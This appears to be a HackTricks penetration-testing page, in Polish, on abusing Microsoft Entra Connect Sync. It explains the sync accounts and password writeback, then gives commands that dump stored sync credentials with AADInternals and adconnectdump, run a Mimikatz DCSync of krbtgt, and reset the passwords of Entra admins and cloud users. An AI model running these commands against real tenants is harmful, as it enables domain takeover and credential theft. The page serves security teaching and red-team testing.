# Az - Connect Sync

{{#include ../../../../banners/hacktricks-training.md}}

## Podstawowe informacje

[Z dokumentacji:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sync-whatis) Microsoft Entra Connect synchronization services (Microsoft Entra Connect Sync) to główny komponent Microsoft Entra Connect. Zajmuje się wszystkimi operacjami związanymi z synchronizacją danych tożsamości między Twoim lokalnym środowiskiem a Microsoft Entra ID.

Aby z niego skorzystać, należy zainstalować agenta **`Microsoft Entra Connect Sync`** na serwerze w Twoim środowisku AD. To ten agent będzie odpowiedzialny za synchronizację z strony AD.

<figure><img src="../../../../images/image (173).png" alt=""><figcaption></figcaption></figure>

**Connect Sync** to zasadniczo "stary" sposób Azure na **synchronizację użytkowników z AD do Entra ID.** Nowym zalecanym sposobem jest użycie **Entra Cloud Sync**:

{{#ref}}
az-cloud-sync.md
{{#endref}}

### Wygenerowane zasady

- Konto **`MSOL_<installationID>`** jest automatycznie tworzone w lokalnym AD. To konto otrzymuje rolę **Directory Synchronization Accounts** (zobacz [dokumentację](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles#directory-synchronization-accounts-permissions)), co oznacza, że ma **uprawnienia replikacji (DCSync) w lokalnym AD**.
- Oznacza to, że każdy, kto skompromituje to konto, będzie mógł skompromitować lokalną domenę.
- W lokalnym AD tworzone jest zarządzane konto serwisowe **`ADSyncMSA<id>`** bez żadnych specjalnych domyślnych uprawnień.
- W Entra ID tworzony jest Service Principal **`ConnectSyncProvisioning_ConnectSync_<id>`** z certyfikatem.

## Synchronizacja haseł

### Synchronizacja skrótów haseł

Ten komponent może być również używany do **synchronizacji haseł z AD do Entra ID**, aby użytkownicy mogli używać swoich haseł AD do logowania się do Entra ID. W tym celu należy zezwolić na synchronizację skrótów haseł w agencie Microsoft Entra Connect Sync zainstalowanym na serwerze AD.

[Z dokumentacji:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-phs) **Synchronizacja skrótów haseł** to jedna z metod logowania używanych do osiągnięcia hybrydowej tożsamości. **Azure AD Connect** synchronizuje skrót, skrótu, hasła użytkownika z lokalnej instancji Active Directory do instancji Azure AD w chmurze.

Zasadniczo, wszyscy **użytkownicy** oraz **skrót skrótów haseł** są synchronizowani z lokalnego AD do Azure AD. Jednak **hasła w postaci czystego tekstu** ani **oryginalne** **skróty** nie są wysyłane do Azure AD.

**Synchronizacja skrótów** odbywa się co **2 minuty**. Jednak domyślnie **wygaszenie haseł** i **wygaszenie konta** **nie są synchronizowane** w Azure AD. Tak więc użytkownik, którego **lokalne hasło wygasło** (nie zmienione), może nadal **uzyskiwać dostęp do zasobów Azure** za pomocą starego hasła.

Gdy lokalny użytkownik chce uzyskać dostęp do zasobu Azure, **uwierzytelnienie odbywa się w Azure AD**.

> [!NOTE]
> Domyślnie użytkownicy znanych grup uprzywilejowanych, takich jak Administratorzy Domeny, z atrybutem **`adminCount` równym 1, nie są synchronizowani** z Entra ID z powodów bezpieczeństwa. Jednak inni użytkownicy, którzy są częścią grup uprzywilejowanych bez tego atrybutu lub którzy mają przypisane wysokie uprawnienia bezpośrednio, **mogą być synchronizowani**.

### Zapis hasła

Ta konfiguracja pozwala na **synchronizację haseł z Entra ID do AD**, gdy użytkownik zmienia swoje hasło w Entra ID. Należy pamiętać, że aby zapis hasła działał, użytkownik `MSOL_<id>` automatycznie generowany w AD musi otrzymać [więcej uprawnień, jak wskazano w dokumentacji](https://learn.microsoft.com/en-us/entra/identity/authentication/tutorial-enable-sspr-writeback), aby mógł **zmieniać hasła dowolnego użytkownika w AD**.

Jest to szczególnie interesujące, aby skompromitować AD z skompromitowanego Entra ID, ponieważ będziesz mógł zmienić hasło "prawie" dowolnego użytkownika.

Administratorzy domeny i inni użytkownicy należący do niektórych grup uprzywilejowanych nie są replikowani, jeśli grupa ma atrybut **`adminCount` równy 1**. Ale inni użytkownicy, którzy otrzymali wysokie uprawnienia w AD, nie należąc do żadnej z tych grup, mogą mieć zmienione hasło. Na przykład:

- Użytkownicy przypisani bezpośrednio do wysokich uprawnień.
- Użytkownicy z grupy **`DNSAdmins`**.
- Użytkownicy z grupy **`Group Policy Creator Owners`**, którzy stworzyli GPO i przypisali je do OU, będą mogli modyfikować GPO, które stworzyli.
- Użytkownicy z grupy **`Cert Publishers Group`**, którzy mogą publikować certyfikaty w Active Directory.
- Użytkownicy z jakiejkolwiek innej grupy z wysokimi uprawnieniami bez atrybutu **`adminCount` równym 1**.

## Pivotowanie AD --> Entra ID

### Enumeracja Connect Sync

Sprawdź użytkowników:
```bash
# Check for the users created by the Connect Sync
Install-WindowsFeature RSAT-AD-PowerShell
Import-Module ActiveDirectory
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Properties * | select SamAccountName,Description | fl
Get-ADServiceAccount -Filter "SamAccountName -like 'ADSyncMSA*'" -Properties SamAccountName,Description | Select-Object SamAccountName,Description | fl
Get-ADUser -Filter "samAccountName -like 'Sync_*'" -Properties * | select SamAccountName,Description | fl

# Check it using raw LDAP queries without needing an external module
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.Filter = "(samAccountName=MSOL_*)"
$searcher.FindAll()
$searcher.Filter = "(samAccountName=ADSyncMSA*)"
$searcher.FindAll()
$searcher.Filter = "(samAccountName=Sync_*)"
$searcher.FindAll()
```
Sprawdź konfigurację **Connect Sync** (jeśli istnieje):
```bash
az rest --url "https://graph.microsoft.com/v1.0/directory/onPremisesSynchronization"
# Check if password sychronization is enabled, if password and group writeback are enabled...
```
### Znajdowanie haseł

Hasła użytkownika **`MSOL_*`** (i użytkownika **Sync\_\***, jeśli został utworzony) są **przechowywane w serwerze SQL** na serwerze, na którym **zainstalowano Entra ID Connect.** Administratorzy mogą wydobyć hasła tych uprzywilejowanych użytkowników w postaci czystego tekstu.\
Baza danych znajduje się w `C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf`.

Możliwe jest wydobycie konfiguracji z jednej z tabel, z której jedna jest zaszyfrowana:

`SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent;`

**Zaszyfrowana konfiguracja** jest szyfrowana za pomocą **DPAPI** i zawiera **hasła użytkownika `MSOL_*`** w lokalnym AD oraz hasło **Sync\_\*** w AzureAD. Dlatego kompromitując te dane, można uzyskać dostęp do AD i AzureAD.

Możesz znaleźć [pełny przegląd tego, jak te poświadczenia są przechowywane i odszyfrowywane w tej prezentacji](https://www.youtube.com/watch?v=JEIR5oGCwdg).

### Wykorzystywanie MSOL\_*
```bash
# Once the Azure AD connect server is compromised you can extract credentials with the AADInternals module
Install-Module -Name AADInternals -RequiredVersion 0.9.0 # Uninstall-Module AADInternals  if you have a later version
Import-Module AADInternals
Get-AADIntSyncCredentials
# Or check DumpAADSyncCreds.exe from https://github.com/Hagrid29/DumpAADSyncCreds/tree/main

# Using https://github.com/dirkjanm/adconnectdump
python .\adconnectdump.py [domain.local]/administrator:<password>@192.168.10.80
.\ADSyncQuery.exe C:\Users\eitot\Tools\adconnectdump\ADSync.mdf > out.txt
python .\adconnectdump.py [domain.local]/administrator:<password>@192.168.10.80 --existing-db --from-file out.txt

# Using the creds of MSOL_* account, you can run DCSync against the on-prem AD
runas /netonly /user:defeng.corp\MSOL_123123123123 cmd
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local /dc:dc.domain.local"'
```
> [!WARNING]
> Poprzednie ataki skompromitowały inne hasło, aby następnie połączyć się z użytkownikiem Entra ID o nazwie `Sync_*` i skompromitować Entra ID. Jednak ten użytkownik już nie istnieje.

### Wykorzystywanie ConnectSyncProvisioning_ConnectSync\_<id>

Aplikacja ta została stworzona bez przypisanych ról zarządzania Entra ID lub Azure. Jednak ma następujące uprawnienia API:

- Microsoft Entra AD Synchronization Service
- `ADSynchronization.ReadWrite.All`
- Microsoft password reset service
- `PasswordWriteback.OffboardClient.All`
- `PasswordWriteback.RefreshClient.All`
- `PasswordWriteback.RegisterClientVersion.All`

Wspomniano, że SP tej aplikacji może być nadal używany do wykonywania niektórych uprzywilejowanych działań za pomocą niedokumentowanego API, ale jak dotąd nie znaleziono żadnego PoC, o ile mi wiadomo.\
W każdym razie, myśląc, że może to być możliwe, warto zbadać, jak znaleźć certyfikat do logowania się jako ten principal usługowy i spróbować go wykorzystać.

Ten [post na blogu](https://posts.specterops.io/update-dumping-entra-connect-sync-credentials-4a9114734f71) został opublikowany tuż przed zmianą z używania użytkownika `Sync_*` na ten principal usługowy, wyjaśnił, że certyfikat był przechowywany na serwerze i możliwe było jego znalezienie, wygenerowanie PoP (Proof of Possession) oraz tokenu grafowego, a dzięki temu można było dodać nowy certyfikat do principal usługowy (ponieważ **principal usługowy** zawsze może przypisać sobie nowe certyfikaty) i następnie użyć go do utrzymania trwałości jako SP.

Aby wykonać te działania, opublikowane są następujące narzędzia: [SharpECUtils](https://github.com/hotnops/ECUtilities/tree/main/SharpECUtils).

Z mojego doświadczenia wynika, że certyfikat nie jest już przechowywany w miejscu, w którym poprzednie narzędzie go szukało, dlatego narzędzie już nie działa. Może być więc potrzebne dalsze badanie.

### Wykorzystywanie Sync\_\* [DEPRECATED]

> [!WARNING]
> Wcześniej użytkownik o nazwie `Sync_*` został utworzony w Entra ID z bardzo wrażliwymi uprawnieniami, które pozwalały na wykonywanie uprzywilejowanych działań, takich jak modyfikowanie hasła dowolnego użytkownika lub dodawanie nowego poświadczenia do principal usługowy. Jednak od stycznia 2025 ten użytkownik nie jest już tworzony domyślnie, ponieważ teraz używana jest aplikacja/SP **`ConnectSyncProvisioning_ConnectSync_<id>`**. Może jednak nadal być obecny w niektórych środowiskach, więc warto to sprawdzić.

Skompromitowanie konta **`Sync_*`** umożliwia **zresetowanie hasła** dowolnego użytkownika (w tym Globalnych Administratorów).
```bash
Install-Module -Name AADInternals -RequiredVersion 0.9.0 # Uninstall-Module AADInternals  if you have a later version
Import-Module AADInternals

# This command, run previously, will give us alse the creds of this account
Get-AADIntSyncCredentials

# Get access token for Sync_* account
$passwd = ConvertTo-SecureString '<password>' -AsPlainText - Force
$creds = New-Object System.Management.Automation.PSCredential ("Sync_SKIURT-JAUYEH_123123123123@domain.onmicrosoft.com", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds - SaveToCache

# Get global admins
Get-AADIntGlobalAdmins

# Get the ImmutableId of an on-prem user in Azure AD (this is the Unique Identifier derived from on-prem GUID)
Get-AADIntUser -UserPrincipalName onpremadmin@domain.onmicrosoft.com | select ImmutableId

# Reset the users password
Set-AADIntUserPassword -SourceAnchor "3Uyg19ej4AHDe0+3Lkc37Y9=" -Password "JustAPass12343.%" -Verbose

# Now it's possible to access Azure AD with the new password and op-prem with the old one (password changes aren't sync)
```
Możliwe jest również **zmienienie haseł tylko użytkowników chmurowych** (nawet jeśli to nieoczekiwane)
```bash
# To reset the password of cloud only user, we need their CloudAnchor that can be calculated from their cloud objectID
# The CloudAnchor is of the format USER_ObjectID.
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID

# Reset password
Set-AADIntUserPassword -CloudAnchor "User_19385ed9-sb37-c398-b362-12c387b36e37" -Password "JustAPass12343.%" -Verbosewers
```
Możliwe jest również zrzucenie hasła tego użytkownika.

> [!CAUTION]
> Inną opcją byłoby **przyznanie uprawnień uprzywilejowanych dla principal usługi**, co użytkownik **Sync** ma **uprawnienia** do zrobienia, a następnie **uzyskanie dostępu do tego principal usługi** jako sposób na privesc.

### Seamless SSO

Możliwe jest użycie Seamless SSO z PHS, które jest podatne na inne nadużycia. Sprawdź to w:

{{#ref}}
seamless-sso.md
{{#endref}}

## Pivoting Entra ID --> AD

- Jeśli włączono zapis hasła, możesz **zmodyfikować hasło dowolnego użytkownika w AD**, który jest synchronizowany z Entra ID.
- Jeśli włączono zapis grup, możesz **dodać użytkowników do uprzywilejowanych grup** w Entra ID, które są synchronizowane z AD.

## References

- [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs)
- [https://aadinternals.com/post/on-prem_admin/](https://aadinternals.com/post/on-prem_admin/)
- [https://troopers.de/downloads/troopers19/TROOPERS19_AD_Im_in_your_cloud.pdf](https://troopers.de/downloads/troopers19/TROOPERS19_AD_Im_in_your_cloud.pdf)
- [https://www.youtube.com/watch?v=xei8lAPitX8](https://www.youtube.com/watch?v=xei8lAPitX8)
- [https://www.silverfort.com/blog/exploiting-weaknesses-in-entra-id-account-synchronization-to-compromise-the-on-prem-environment/](https://www.silverfort.com/blog/exploiting-weaknesses-in-entra-id-account-synchronization-to-compromise-the-on-prem-environment/)
- [https://posts.specterops.io/update-dumping-entra-connect-sync-credentials-4a9114734f71](https://posts.specterops.io/update-dumping-entra-connect-sync-credentials-4a9114734f71)

{{#include ../../../../banners/hacktricks-training.md}}
